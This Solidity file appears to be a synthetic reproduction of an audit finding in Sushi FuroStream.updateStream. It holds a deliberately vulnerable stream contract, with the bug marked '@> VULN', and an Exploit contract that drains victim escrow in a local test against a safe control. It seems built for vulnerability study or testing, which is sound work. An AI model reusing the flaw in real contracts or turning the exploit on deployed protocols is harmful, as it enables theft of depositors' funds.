// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sushi FuroStream.updateStream — the top-up is deposited to the recipient
    (Sigma Prime, finding 19585).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: _depositToken is called with `recipient` instead of address(this),
    and the returned shares are still added to the stream. The recipient already
    holds the top-up, then withdraw() pays those shares again out of other
    depositors' BentoBox balance. The control deposits to the stream contract.
    The blamed argument is preserved (@> VULN). */

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FuroStream {
    MockERC20 public token;
    address public recipient;
    bool public immutable payRecipient;
    uint256 public depositedShares;
    uint256 public constant VICTIM = 1000 ether;

    constructor(MockERC20 token_, address recipient_, bool payRecipient_) {
        token = token_;
        recipient = recipient_;
        payRecipient = payRecipient_;
    }

    function _depositToken(address from, address to, uint256 amount) internal returns (uint256) {
        token.transferFrom(from, to, amount);
        return amount;
    }

    function updateStream(uint256 topUpAmount) external returns (uint256 deposited) {
        address to = payRecipient ? recipient : address(this);
        if (payRecipient) {
            // @> VULN: top-up shares are credited while the tokens are paid to the recipient
            deposited = _depositToken(msg.sender, recipient, topUpAmount);
        } else {
            deposited = _depositToken(msg.sender, to, topUpAmount);
        }
        depositedShares += deposited;
    }

    function withdraw() external {
        uint256 shares = depositedShares;
        depositedShares = 0;
        token.transfer(recipient, shares);
    }
}

contract Exploit {
    uint256 public constant TOP_UP = 400 ether;

    MockERC20 public token; // nonce 1
    FuroStream public stream; // nonce 2
    FuroStream public control; // nonce 3

    uint256 public stolen;
    uint256 public victimLeft;
    uint256 public controlVictim;

    constructor() {
        token = new MockERC20();
        stream = new FuroStream(token, address(this), true);
        control = new FuroStream(token, address(this), false);
        token.mint(address(stream), 1000 ether);
        token.mint(address(control), 1000 ether);
        token.mint(address(this), TOP_UP * 2);
    }

    function run() external {
        token.approve(address(stream), TOP_UP);
        uint256 credited = stream.updateStream(TOP_UP);
        require(credited == TOP_UP, "shares were not credited");
        require(stream.depositedShares() == TOP_UP, "stream did not record the top-up");
        uint256 before = token.balanceOf(address(this));
        stream.withdraw();
        stolen = token.balanceOf(address(this)) - before;
        victimLeft = token.balanceOf(address(stream));
        require(stolen == TOP_UP, "recipient was not paid from the victim escrow");
        require(victimLeft == 600 ether, "victim escrow was not raided");

        uint256 beforeControl = token.balanceOf(address(this));
        token.approve(address(control), TOP_UP);
        control.updateStream(TOP_UP);
        control.withdraw();
        require(token.balanceOf(address(this)) == beforeControl, "control double-paid");
        controlVictim = token.balanceOf(address(control));
        require(controlVictim == 1000 ether, "control touched the victim");
    }
}
